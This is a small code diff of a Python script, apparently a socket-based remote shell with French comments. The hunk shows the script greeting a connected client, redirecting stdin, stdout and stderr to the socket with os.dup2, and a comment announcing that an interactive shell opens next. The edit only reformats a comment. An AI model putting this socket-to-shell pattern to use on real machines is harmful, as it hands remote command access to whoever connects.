@@ -24,7 +24,8 @@ print(address)
 welcomeMessage = "Hello\n"
 client.send(bytes(welcomeMessage, encoding='utf8'))
 
-for f in range(3):  # Redirection des entrées sorties stdin, stdout, stderr
+# Redirection des entrées/sorties stdin, stdout, stderr
+for f in range(3):
     os.dup2(client.fileno(), f)
 
 # Ouverture d'un shell en mode interactif
